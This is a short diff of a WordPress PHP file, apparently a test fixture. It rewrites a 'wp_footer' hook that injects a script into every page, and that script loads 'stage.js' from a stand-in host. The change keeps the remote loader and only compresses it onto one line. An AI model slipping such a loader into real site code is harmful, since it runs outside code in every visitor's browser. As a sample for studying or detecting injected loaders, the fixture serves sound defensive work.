@@ -14,9 +14,5 @@ add_action('wp_enqueue_scripts', function () {
 });
 
 add_action('wp_footer', function () {
-    echo '<script>';
-    echo 'var el = document.createElement(\'script\');';
-    echo 'el.src = \'https://example-fixture.invalid/stage.js\';';
-    echo 'document.head.appendChild(el);';
-    echo '</script>';
+    echo "<script>var el = document.createElement('script'); el.src = 'https://example-fixture.invalid/stage.js'; document.head.appendChild(el);</script>";
 });
